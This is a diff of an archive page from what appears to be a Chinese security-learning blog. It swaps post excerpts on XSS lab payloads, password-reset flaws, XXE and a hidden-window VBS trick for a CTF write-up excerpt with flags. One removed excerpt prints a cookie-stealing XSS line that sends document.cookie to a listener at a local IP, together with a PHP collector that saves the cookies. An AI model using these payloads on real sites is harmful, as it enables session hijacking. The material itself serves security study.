@@ -346,175 +346,25 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/28/XSS练习靶场/" >
+        <a class="abstract-title" href = "/2019/02/03/hgame草稿/" >
             
-                <span>XSS练习靶场</span>
+                <span>hgame-web-week1</span>
         </a>
         <div class="abstract-content">
-            一、DVWA1.DOMlow：&lt;script&gt;alert(1)&lt;/script&gt;medium：&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;注意有的要包裹前面的high：English#&lt;script&gt;alert(1)&lt;/script&gt;服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句
-2.stored和reflect&lt;img src=1 onerror=alert(1)&gt;通关所有
-二、XSS靶场level1：h...
+            1. 谁吃了我的flag获取vim备份文件vim自动退出会临时备份隐藏文件 .xxx.swp用linux打vim -r .xxx.swp 可以恢复备份文件hgame{3eek_diScl0Sure_fRom+wEbsit@}
+2. 换头大作战输入框输入，要求使用postpost输入要求使用waterfox，更改要求bilibili登录最后得到flaghgame{hTTp_HeaDeR_iS_Ez}
+3. very easy web1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(s...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/28</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
             </div>
             <!-- tags  -->
             
             <div class= abstract-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/28/制作windows小脚本/" >
-            
-                <span>制作windows小脚本</span>
-        </a>
-        <div class="abstract-content">
-            bat可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了如：12ping www.baidu.comping www.sina.com
-vbs执行bat脚本如何隐藏，cmd窗口呢，可以通过vbs脚本来打开将一下代码保存为.vbs文件，运行该文件即可12Set ws = CreateObject(&quot;Wscript.Shell&quot;)ws.run &quot;cmd /c htmer.bat&quot;,vbhide
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/22/任意用户密码重置/" >
-            
-                <span>任意用户密码重置</span>
-        </a>
-        <div class="abstract-content">
-            任意用户密码重置1.案例1.百度某站任意用户密码重置http://www.anquan.us/static/bugs/wooyun-2016-0207468.html（1）抓重置密码数据包（2）查看数据包中的token（3）查看url中标识身份的数据段（4）发现token与url数据段是一致！！（5）通过使用token构造url进行密码重置2.米鼠网任意用户密码重置http://www.anquan.us/static/bugs/wooyun-2016-0211505.html（1）访问密码找回页面（2）随便输名字burp抓包（3）查看到手机号在请求包和源    代码中（4）查看源代码（...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/22/XSS利用/" >
-            
-                <span>XSS利用</span>
-        </a>
-        <div class="abstract-content">
-            窃取cookieget.js1document.createElement(&apos;img&apos;).src=&apos;http://192.168.138.1:8001/get.php?cookie=&apos; + document.cookie + &apos;&gt;&apos;
-get.php12345$text = file_get_contents(&quot;./cookie.txt&quot;);$text = $text . &quot;\n&quot; . $_GET[&apos;cookie&apos;];file_put_contents(&quot;...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/20/python脚本-自动上传到hexo/" >
-            
-                <span>python脚本-自动上传到hexo</span>
-        </a>
-        <div class="abstract-content">
-            一、压缩与解压导入相应模块1234import osimport shutilimport zipfilefrom os.path import join, getsize
-1. python压缩指定文件夹12345678910def zip_file(src_dir):    zip_name = src_dir +&apos;.zip&apos;    z = zipfile.ZipFile(zip_name,&apos;w&apos;,zipfile.ZIP_DEFLATED)    for dirpath, dirnames, filenames in os.walk(src_d...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/07/20/PHP XXE/" >
-            
-                <span>PHP XXE</span>
-        </a>
-        <div class="abstract-content">
-            xml是什么XML指可扩展标记语言用处：被设计用来传输和存储数据。与HTML区别：HTML是被设计用来显示数据，HTML具有特效，XML用来传输数据XML 标签没有被预定义。需要自行定义标签XML 被设计为具有自我描述性
-一个XML文档实例第一行是xml声明，定义版本和使用编码第二行是根元素，一个xml文档必须拥有根元素其下几行是子元素1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&l...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
     
 </div>
             
@@ -522,6 +372,10 @@ get.php12345$text = file_get_contents(&quot;./cookie.txt&quot;);$text = $text . 
     </article>
     
     <!-- paginator  -->
+    
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/archives/2019/page/2/">&#60; PREV</a><a class="page-number" href="/archives/2019/">1</a><a class="page-number" href="/archives/2019/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
     
 </main>
             <!-- profile -->
